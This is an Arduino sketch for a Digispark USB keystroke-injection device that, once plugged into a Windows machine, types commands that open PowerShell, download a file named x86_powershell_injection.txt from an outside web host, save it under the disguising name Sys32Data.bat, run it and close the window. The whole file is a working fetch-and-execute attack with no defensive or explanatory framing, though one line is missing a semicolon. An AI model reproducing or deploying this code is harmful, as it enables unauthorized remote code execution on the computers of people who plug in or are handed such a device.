
#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {}

void loop()
{
 int d=1000;
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(d);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(600);
 DigiKeyboard.print("powershell");
 DigiKeyboard.delay(50);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d)
 DigiKeyboard.print("$client = new-object System.Net.WebClient");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client.DownloadFile('http://www.marcopg.com/x86_powershell_injection.txt','Sys32Data.bat')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.print("start Sys32Data.bat");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for(;;){}
}
